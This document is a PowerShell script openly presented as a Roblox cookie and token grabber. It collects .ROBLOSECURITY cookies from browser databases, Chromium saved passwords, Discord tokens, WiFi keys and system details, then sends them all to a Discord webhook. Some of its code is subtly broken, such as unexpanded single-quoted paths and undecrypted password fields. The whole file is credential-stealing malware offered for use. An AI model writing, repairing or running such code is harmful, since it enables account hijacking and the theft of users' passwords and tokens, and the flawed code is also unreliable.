# Roblox Cookie & Token Grabber
# GitHub hosted version

$webhook = "YOUR_DISCORD_WEBHOOK_HERE";

function Send-ToDiscord {
    param($content, $files = $null)
    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
        $payload = @{ content = $content } | ConvertTo-Json;
        $headers = @{ 'Content-Type' = 'application/json' };
        $response = Invoke-WebRequest -Uri $webhook -Method POST -Headers $headers -Body $payload -TimeoutSec 15 -UseBasicParsing;
        return $response.StatusCode -in 200, 201, 204;
    } catch { return $false }
}

function Get-SystemInfo {
    $info = @{};
    $info['user'] = $env:USERNAME;
    $info['computer'] = $env:COMPUTERNAME;
    $info['domain'] = $env:USERDOMAIN;
    try { $info['ip'] = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content } catch { $info['ip'] = 'Unknown' }
    $info['os'] = (Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption;
    $info['time'] = Get-Date -Format 'yyyy-MM-dd HH:mm:ss';
    $info['pid'] = $pid;
    return $info;
}

function Get-RobloxCookies {
    $results = @();
    $browsers = @{
        'Chrome' = '$env:LOCALAPPDATA\Google\Chrome\User Data';
        'Edge' = '$env:LOCALAPPDATA\Microsoft\Edge\User Data';
        'Brave' = '$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data';
        'Opera' = '$env:APPDATA\Opera Software\Opera Stable';
        'Vivaldi' = '$env:LOCALAPPDATA\Vivaldi\User Data';
        'Yandex' = '$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data';
    };
    foreach ($browser in $browsers.Keys) {
        $base = [System.Environment]::ExpandEnvironmentVariables($browsers[$browser]);
        if (-not (Test-Path $base)) { continue; }
        $profiles = @('Default');
        for ($i=1; $i -le 5; $i++) { $profiles += 'Profile ' + $i; }
        foreach ($profile in $profiles) {
            $cookieDbs = @(
                (Join-Path $base $profile 'Network\Cookies'),
                (Join-Path $base $profile 'Cookies')
            );
            foreach ($db in $cookieDbs) {
                if (Test-Path $db) {
                    try {
                        $temp = [System.IO.Path]::GetTempFileName();
                        Copy-Item $db $temp -Force -ErrorAction SilentlyContinue;
                        $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=' + $temp);
                        $conn.Open();
                        $cmd = $conn.CreateCommand();
                        $cmd.CommandText = 'SELECT host_key, name, value FROM cookies WHERE name = ''.ROBLOSECURITY'' OR value LIKE ''%.ROBLOSECURITY%''';
                        $reader = $cmd.ExecuteReader();
                        while ($reader.Read()) {
                            $val = $reader.GetString(2);
                            if ($val -and $val.Length -gt 30) {
                                $results += @{
                                    browser = $browser;
                                    profile = $profile;
                                    host = $reader.GetString(0);
                                    name = $reader.GetString(1);
                                    value = $val;
                                };
                            }
                        }
                        $conn.Close();
                        Remove-Item $temp -Force -ErrorAction SilentlyContinue;
                    } catch {}
                }
            }
        }
    }
    return $results;
}

function Get-FirefoxRoblox {
    $results = @();
    $ff = [System.Environment]::ExpandEnvironmentVariables('$env:APPDATA\Mozilla\Firefox\Profiles');
    if (Test-Path $ff) {
        Get-ChildItem $ff -Directory | ForEach-Object {
            $db = Join-Path $_.FullName 'cookies.sqlite';
            if (Test-Path $db) {
                try {
                    $temp = [System.IO.Path]::GetTempFileName();
                    Copy-Item $db $temp -Force -ErrorAction SilentlyContinue;
                    $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=' + $temp);
                    $conn.Open();
                    $cmd = $conn.CreateCommand();
                    $cmd.CommandText = 'SELECT host, name, value FROM moz_cookies WHERE name = ''.ROBLOSECURITY''';
                    $reader = $cmd.ExecuteReader();
                    while ($reader.Read()) {
                        $val = $reader.GetString(2);
                        if ($val -and $val.Length -gt 30) {
                            $results += @{
                                browser = 'Firefox';
                                profile = $_.Name;
                                host = $reader.GetString(0);
                                name = $reader.GetString(1);
                                value = $val;
                            };
                        }
                    }
                    $conn.Close();
                    Remove-Item $temp -Force -ErrorAction SilentlyContinue;
                } catch {}
            }
        }
    }
    return $results;
}

function Get-ChromePasswords {
    $results = @();
    $browsers = @{
        'Chrome' = '$env:LOCALAPPDATA\Google\Chrome\User Data';
        'Edge' = '$env:LOCALAPPDATA\Microsoft\Edge\User Data';
        'Brave' = '$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data';
    };
    foreach ($browser in $browsers.Keys) {
        $base = [System.Environment]::ExpandEnvironmentVariables($browsers[$browser]);
        if (-not (Test-Path $base)) { continue; }
        $profiles = @('Default');
        for ($i=1; $i -le 3; $i++) { $profiles += 'Profile ' + $i; }
        foreach ($profile in $profiles) {
            $db = Join-Path $base $profile 'Login Data';
            if (Test-Path $db) {
                try {
                    $temp = [System.IO.Path]::GetTempFileName();
                    Copy-Item $db $temp -Force -ErrorAction SilentlyContinue;
                    $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=' + $temp);
                    $conn.Open();
                    $cmd = $conn.CreateCommand();
                    $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins';
                    $reader = $cmd.ExecuteReader();
                    while ($reader.Read()) {
                        $pass = $reader.GetString(2);
                        if ($pass -and $pass.Length -gt 0) {
                            $results += @{
                                browser = $browser;
                                profile = $profile;
                                url = $reader.GetString(0);
                                username = $reader.GetString(1);
                                password = $pass;
                            };
                        }
                    }
                    $conn.Close();
                    Remove-Item $temp -Force -ErrorAction SilentlyContinue;
                } catch {}
            }
        }
    }
    return $results;
}

function Get-DiscordTokens {
    $tokens = @();
    $paths = @(
        '$env:APPDATA\discord\Local Storage\leveldb',
        '$env:APPDATA\discordcanary\Local Storage\leveldb',
        '$env:APPDATA\discordptb\Local Storage\leveldb',
        '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb',
        '$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb'
    );
    $pattern = '[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}';
    foreach ($p in $paths) {
        $resolved = [System.Environment]::ExpandEnvironmentVariables($p);
        if (Test-Path $resolved) {
            Get-ChildItem $resolved -Filter '*.log' -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;
                    $matches = [System.Text.RegularExpressions.Regex]::Matches($content, $pattern);
                    foreach ($m in $matches) {
                        if ($m.Value -notin $tokens) { $tokens += $m.Value }
                    }
                } catch {}
            }
            Get-ChildItem $resolved -Filter '*.ldb' -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;
                    $matches = [System.Text.RegularExpressions.Regex]::Matches($content, $pattern);
                    foreach ($m in $matches) {
                        if ($m.Value -notin $tokens) { $tokens += $m.Value }
                    }
                } catch {}
            }
        }
    }
    return $tokens;
}

function Get-WifiPasswords {
    $results = @();
    try {
        $profiles = netsh wlan show profiles | Select-String 'All User Profile\s*:\s*(.+)';
        foreach ($p in $profiles) {
            $ssid = $p.Matches.Groups[1].Value.Trim();
            if ($ssid) {
                $detail = netsh wlan show profile name='$ssid' key=clear;
                $pass = 'N/A';
                foreach ($line in $detail) {
                    if ($line -match 'Key Content\s*:\s*(.+)') {
                        $pass = $matches[1].Trim();
                        break;
                    }
                }
                $results += @{ ssid = $ssid; password = $pass };
            }
        }
    } catch {}
    return $results;
}

function Get-StealData {
    try {
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue;
    } catch {}
    $sys = Get-SystemInfo;
    $roblox = @();
    $roblox += Get-RobloxCookies;
    $roblox += Get-FirefoxRoblox;
    $passwords = Get-ChromePasswords;
    $discord = Get-DiscordTokens;
    $wifi = Get-WifiPasswords;
    
    # Deduplicate
    $unique = @{};
    $final = @();
    foreach ($c in $roblox) {
        $key = $c.value.Substring(0, [Math]::Min(40, $c.value.Length));
        if (-not $unique.ContainsKey($key)) {
            $unique[$key] = $true;
            $final += $c;
        }
    }
    
    $msg = '🎯 **ROBLOX STEALER v2.0**\n\n';
    $msg += '👤 ' + $sys.user + ' | 💻 ' + $sys.computer + '\n';
    $msg += '🌐 ' + $sys.ip + ' | 🕐 ' + $sys.time + '\n';
    $msg += '🖥️ ' + $sys.os + '\n';
    $msg += '📌 PID: ' + $sys.pid + '\n\n';
    
    if ($final.Count -gt 0) {
        $msg += '🍪 **ROBLOX COOKIES (' + $final.Count + ')**\n';
        $msg += '=' * 40 + '\n\n';
        foreach ($c in $final) {
            $msg += '📌 [' + $c.browser + '][' + $c.profile + ']\n';
            $msg += '   ' + $c.value + '\n\n';
        }
    } else {
        $msg += '❌ No Roblox cookies found\n\n';
    }
    
    if ($discord.Count -gt 0) {
        $msg += '🎫 **DISCORD TOKENS (' + $discord.Count + ')**\n';
        $msg += '=' * 40 + '\n\n';
        foreach ($t in $discord) {
            $msg += '   ' + $t + '\n';
        }
        $msg += '\n';
    }
    
    if ($passwords.Count -gt 0) {
        $msg += '🔑 **PASSWORDS (' + $passwords.Count + ')**\n';
        $msg += '=' * 40 + '\n\n';
        foreach ($p in $passwords) {
            $msg += '[' + $p.browser + '][' + $p.profile + ']\n';
            $msg += '   URL: ' + $p.url + '\n';
            $msg += '   User: ' + $p.username + '\n';
            $msg += '   Pass: ' + $p.password + '\n\n';
        }
    }
    
    if ($wifi.Count -gt 0) {
        $msg += '📶 **WIFI PASSWORDS (' + $wifi.Count + ')**\n';
        $msg += '=' * 40 + '\n\n';
        foreach ($w in $wifi) {
            $msg += '   ' + $w.ssid + ' → ' + $w.password + '\n';
        }
        $msg += '\n';
    }
    
    Send-ToDiscord -content $msg;
}

# Execute
Get-StealData;

# Clean up
$null = $final;
$null = $unique;
